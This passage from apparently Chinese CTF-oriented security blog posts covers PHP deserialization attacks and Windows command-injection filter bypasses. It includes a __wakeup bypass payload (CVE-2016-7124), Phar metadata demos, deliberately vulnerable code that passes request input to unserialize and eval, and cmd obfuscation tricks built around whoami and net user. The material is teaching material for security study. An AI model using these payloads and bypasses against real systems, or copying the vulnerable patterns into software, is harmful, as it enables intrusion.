is OK&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"variable\">$test</span>();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-19-1024x138.png\" alt=\"img\"></p>\n<p>__clone()：当使用clone关键字拷贝完成一个对象后，生成的新对象会自动调用__clone()。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __clone() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;__clone is OK&quot;</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"variable\">$newclass</span> = <span class=\"keyword\">clone</span> <span class=\"variable\">$test</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-20-1024x116.png\" alt=\"img\"></p>\n<h4 id=\"反序列化小练习\"><a href=\"#反序列化小练习\" class=\"headerlink\" title=\"反序列化小练习\"></a>反序列化小练习</h4><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;monkey&#x27;</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; var1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Hello</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; var1 -&gt; <span class=\"title function_ invoke__\">fun</span>();</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Hello</span></span>&#123; </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fun</span>(<span class=\"params\"></span>)</span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hello unserialize&quot;</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Ev</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var2</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fun</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span> -&gt; var2);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"string\">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>在这里，我们的目的是执行eval函数。所以我们要调用Ev类中的fun()函数，可以通过修改Test类中的var1的值来修改实例化对象。POC构造如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;monkey&#x27;</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var1</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; var1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Ev</span>();</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Ev</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var2</span> = <span class=\"string\">&#x27;phpinfo();&#x27;</span>; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-21-1024x454.png\" alt=\"img\"></p>\n<h4 id=\"wakeup绕过（CVE-2016-7124）\"><a href=\"#wakeup绕过（CVE-2016-7124）\" class=\"headerlink\" title=\"__wakeup绕过（CVE-2016-7124）\"></a>__wakeup绕过（CVE-2016-7124）</h4><p>__wakeup绕过：当序列化字符串中的对象属性个数大于实际的属性个数时会跳过__wakeup()的执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">phpversion</span>(); </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$test</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable language_\">$this</span>-&gt;name !== <span class=\"string\">&quot;admin&quot;</span>)&#123; </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;hacker is No&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span>&#123; </span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;Welcome admin&quot;</span>;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getflag</span>(); </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;hacker&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getflag</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable language_\">$this</span> -&gt; test);</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>]); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>我们要绕过检测，所以我们要将name的值赋予admin，test的值赋予我们想要的，这里以phpinfo为例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$test</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; name = <span class=\"string\">&quot;admin&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; test = <span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(); </span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>序列化的字符串为：O:4:”Test”:2:{s:4:”name”;s:5:”admin”;s:4:”test”;s:10:”phpinfo();”;}</p>\n</blockquote>\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-22-1024x459.png\" alt=\"img\"></p>\n<p>但是这里会显示我们是hacker，所以这里就要使用到__wakeup的绕过了</p>\n<blockquote>\n<p>新的payload：</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-23-1024x459.png\" alt=\"img\"></p>\n<p>这里适用的版本：PHP5&lt;&#x3D;5.6.9或者PHP7&lt;&#x3D;7.0.9。</p>\n<h2 id=\"POP链的构造\"><a href=\"#POP链的构造\" class=\"headerlink\" title=\"POP链的构造\"></a>POP链的构造</h2><p>POP链是什么？<br>称为面向属性编程，用于上层语言构造特定调用链的方法。</p>\n<p>POP链是通过寻找程序中已经定义了或者能够动态加载的对象属性或函数方法，将一些可能的调用组合在一起形成一个完整的、有目的性的操作。</p>\n<p>其他的不说了，直接上题目吧。链接：<a href=\"https://buuoj.cn/challenges#[MRCTF2020]Ezpop\">https://buuoj.cn/challenges#[MRCTF2020]Ezpop</a></p>\n<p>题目WP链接：<a href=\"https://www.threeyear.com.cn/archives/1370\">buuctf-web【MRCTF 2020】Ezpop</a></p>\n<h2 id=\"Phar反序列化攻击\"><a href=\"#Phar反序列化攻击\" class=\"headerlink\" title=\"Phar反序列化攻击\"></a>Phar反序列化攻击</h2><h4 id=\"什么是phar\"><a href=\"#什么是phar\" class=\"headerlink\" title=\"什么是phar\"></a>什么是phar</h4><p>有过Java开发经验的人一定知道Jar文件。一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。</p>\n<p>PHAR（“Php ARchive”）是PHP中类似于JAR的一种打包文件，在PHP&gt;5.3，phar后缀文件是默认支持的。我们要开启phar，要在php.ini中将<code>phar.readonly = 0</code>。</p>\n<h4 id=\"Phar的文件结构\"><a href=\"#Phar的文件结构\" class=\"headerlink\" title=\"Phar的文件结构\"></a>Phar的文件结构</h4><p>PHAR的文件结构主要由四部分组成：</p>\n<p>1.a stub</p>\n<p>可以理解成一个标志（相当于文件头）,格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面的内容不做限制，但是结尾必须是<code>__HALT_COMPILER();?&gt;</code>，否则无法识别为phar文件。</p>\n<p>2.a manifest describing the contents</p>\n<p>因为phar本质上是一种压缩文件，每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是攻击最核心的地方。</p>\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-24.png\" alt=\"img\"></p>\n<p>3.the file contents</p>\n<p>这是被压缩文件的内容。</p>\n<p>4.[optional] a signature for verifying Phar integrity (phar file format only)</p>\n<p>签名，会被放在文件的结尾。</p>\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-25.png\" alt=\"img\"></p>\n<h4 id=\"Phar攻击的实现\"><a href=\"#Phar攻击的实现\" class=\"headerlink\" title=\"Phar攻击的实现\"></a>Phar攻击的实现</h4><blockquote>\n<p>demo测试</p>\n</blockquote>\n<p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); </span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); <span class=\"comment\">//后缀名必须为phar </span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>(); </span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//设置stub </span></span><br><span class=\"line\"><span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">TestObject</span>(); </span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//将自定义的meta-data存入manifest </span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;flag.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//添加要压缩的文件 </span></span><br><span class=\"line\"><span class=\"comment\">//签名自动计算 </span></span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>(); </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-26-1024x543.png\" alt=\"img\"></p>\n<p>使用winhex打开phar.phar文件，发现meta-data是以序列化形式存储的</p>\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-27-1024x207.png\" alt=\"img\"></p>\n<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar:&#x2F;&#x2F;伪协议解析phar文件时，都会将meta-data进行反序列化。</p>\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-28.png\" alt=\"img\"></p>\n<blockquote>\n<p>demo2测试</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Destruct called&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;phar://phar.phar/flag.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-29-1024x545.png\" alt=\"img\"></p>\n<p>因为phar文件只对<code>__HALT_COMPILER();?&gt;</code>这段代码有要求，所以我们可以将其伪造成一张图片或者其他形式进行利用。</p>\n<p>题目：<a href=\"https://buuoj.cn/challenges#[SWPUCTF%202018]SimplePHP\">SWPUCTF 2018SimplePHP</a></p>\n<p>题目wp：<a href=\"https://www.threeyear.com.cn/archives/3670\">buuctf-web【SWPUCTF 2018】SimplePHP</a></p>\n<p>参考文章：</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/mochu7777777/article/details/106909777?ops_request_misc=%7B%22request_id%22:%22166182244716782388047406%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=166182244716782388047406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106909777-null-null.nonecase&utm_term=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450\">由浅入深理解PHP反序列化</a><a href=\"https://blog.csdn.net/mochu7777777/article/details/106909777?ops_request_misc=%7B%22request_id%22:%22166182244716782388047406%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=166182244716782388047406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-106909777-null-null.nonecase&utm_term=phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450\">漏洞</a></li>\n<li><a href=\"https://paper.seebug.org/680/\">利用 phar 拓展 php 反序列化漏洞攻击面</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/377676274\">PHP反序列化研究</a></li>\n</ul>\n<p>持续更新中……</p>\n<p>如果文章有何不妥之处，请您指出。</p>\n","categories":["web安全学习"],"tags":["CTF","web","安全"]},{"title":"常见Windows命令执行漏洞绕过过滤的小技巧","url":"/2022/08/16/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/","content":"<h2 id=\"一、符号与命令的关系\"><a href=\"#一、符号与命令的关系\" class=\"headerlink\" title=\"一、符号与命令的关系\"></a>一、符号与命令的关系</h2><p>在cmd命令中，我们可以使用<code>&quot;</code>、<code>^</code>和<code>()</code>不会影响命令的执行，而且在Windows中命令不会区分大小写。</p>\n<blockquote>\n<p>1.whoami<br>2.w”h”o”a”m”i<br>3.wh^o^ami<br>4.((whoami))</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-4-1024x248.png\"></p>\n<p>这里我们可以同时加多个<code>&quot;</code>，但是不能同时使用多个<code>^^</code>，因为在cmd中<code>^</code>是转义符，跟在他后面的符号会被转义的，所以执行的话会报错。</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-5-1024x90.png\"></p>\n<h2 id=\"二、set命令和Windows变量\"><a href=\"#二、set命令和Windows变量\" class=\"headerlink\" title=\"二、set命令和Windows变量\"></a>二、set命令和Windows变量</h2><p>（1）首先set命令可以用来设置一个变量，%相当于引用一个变量（使用%括起来的变量，会引用其变量内的值）</p>\n<blockquote>\n<p>1.set a&#x3D;1<br>2.echo a<br>3.echo %a%</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-6-1024x98.png\"></p>\n<p>我们还可以设置多个变量来绕过过滤</p>\n<blockquote>\n<p>1.set a &#x3D; who<br>2.set b &#x3D; ami<br>%a%%b%</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-7-1024x87.png\"></p>\n<blockquote>\n<p>set a&#x3D;ser&amp;&amp; set b&#x3D;ne&amp;&amp; set c&#x3D;t u &amp;&amp; call %b%%c%%a%<br>&#x2F;&#x2F;在变量中设置空格，最后调用执行命令</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-8-1024x199.png\"></p>\n<p>似乎翻车了，但是可以记一下，应该还是有作用的。</p>\n<p>我们这里还可以自定义一个或多个环境变量，利用环境变量中的字符，提取并拼接出想要的cmd命令。如：<code>cmd /c &quot;set </code>a<code>=ipconfig &amp;&amp; call echo %</code>a<code>%&quot;</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-10-1024x255.png\"></p>\n<p>我们还可以定义多个环境变量：<code>cmd /c &quot;set a=ser&amp;&amp; set b=ne&amp;&amp; set c=t u&amp;&amp;call echo %b%%c%%a%&quot;</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-11-1024x159.png\"></p>\n<h2 id=\"三、Windows切割字符串\"><a href=\"#三、Windows切割字符串\" class=\"headerlink\" title=\"三、Windows切割字符串\"></a>三、Windows切割字符串</h2><p>Windows中的cmd命令行是存在类似于PHP中的切割字符串的语法。</p>\n<blockquote>\n<p>set a&#x3D;whoami<br>1.%a:<del>0% # 这里表示的是取a中所有字符，也就是whoami<br>2.%a:</del>0,6% # 取出a的值，从第0个开始取，取6个值，也是whoami<br>3.%a:~0,5% # 取五个值，是whoam</p>\n</blockquote>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-12-1024x154.png\"></p>\n<p>所以在cmd中截取字符串的语法就是这样的：<code>%变量名:~x,y%</code>，表示的就是从第x个元素开始取，取y个字符</p>\n<p>然后在Windows中有许多自带的环境变量，然后我们可以截取获得一些有用的东西：</p>\n<p>当空格被过滤的时候，我们可以使用<code>net%CommonProgramFiles:~10,1%user</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-13-1024x115.png\"></p>\n<p>注：CommonProgramFiles&#x3D;C:\\Program Files\\Common Files</p>\n<p>当环境变量中没有我们想要的内容，我们还可以自己进行设置：</p>\n<pre><code>set BL=a bcde/$@\\&quot;;fgphvlrequst?# 设置这个我们就可以构成一个shell了\n</code></pre>\n<h2 id=\"四、逻辑运算符在绕过中的作用\"><a href=\"#四、逻辑运算符在绕过中的作用\" class=\"headerlink\" title=\"四、逻辑运算符在绕过中的作用\"></a>四、逻辑运算符在绕过中的作用</h2><p><code>|</code>在cmd中，可以连接命令，并且只会执行后面的那条命令</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-14-1024x44.png\"></p>\n<p>但是我们使用<code>||</code>的话，只有前面的命令执行失败，才会执行后面的语句</p>\n<p>使用<code>ipconfig || whoami</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-15-1024x389.png\"></p>\n<p>使用<code>ping xxx. || whoami</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-16-1024x54.png\"></p>\n<p>然后&amp;，前面的命令可以成功也可以失败，都会执行后面的命令</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-17-1024x314.png\"></p>\n<p>然后<code>&amp;&amp;</code>符号就必须两条命令都为真才会执行</p>\n<p>使用<code>whoami &amp;&amp; ipconfig</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-18-1024x488.png\"></p>\n<p>使用<code>ping xxx. &amp;&amp; whoami</code></p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81Windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-19-1024x60.png\"></p>\n<p>参考文章：<a 